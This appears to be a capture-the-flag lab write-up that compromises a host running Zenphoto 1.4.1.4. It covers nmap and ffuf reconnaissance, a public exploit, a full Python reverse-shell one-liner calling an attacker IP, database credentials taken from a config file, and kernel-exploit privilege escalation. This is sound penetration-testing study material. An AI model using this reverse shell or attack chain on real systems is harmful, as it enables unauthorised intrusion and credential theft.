`nmap -A -T4 -p- 192.168.152.41`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
```


```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.152.41:80/FUZZ
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.152.41:23/FUZZ -fc 403
```

```
index                   [Status: 200, Size: 75, Words: 2, Lines: 5, Duration: 1179ms]
test                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 38ms]
```


`http://192.168.152.41/test/ zenphoto version 1.4.1.4` [POC](https://www.exploit-db.com/exploits/18083)

![](Images/Pasted%20image%2020250504124423.png)

We were able to get a shell from the exploit, and found we had python installed so we could establish a more stable shell

![](Images/Pasted%20image%2020250504124647.png)

```
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.244",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

![](Images/Pasted%20image%2020250504124726.png)

We can use this shell to grab the local.txt proof.

![](Images/Pasted%20image%2020250504124858.png)


# Post Exploitation
Standard post exploit, move linpeas over and execute nothing really stood out in the linpeas, but looking through the source and nmap scan shows theres a DB

![](Images/Pasted%20image%2020250504130015.png)

We find credentials
```
$conf['mysql_user'] = 'root';           // Supply your Database user id.
$conf['mysql_pass'] = 'hola';           // Supply your Database password.
$conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
$conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 
```

We can login `mysql -u root -p`

![](Images/Pasted%20image%2020250504130159.png)

`admin:63e5c2e178e611b692b526f8b6332317f2ff5513`

Lets see if we can do anything with this. That didn't do anything, lets try the kernel exploits in linpeas output

![](Images/Pasted%20image%2020250504130912.png)

![](Images/Pasted%20image%2020250504131039.png)

That worked.

![](Images/Pasted%20image%2020250504131057.png)






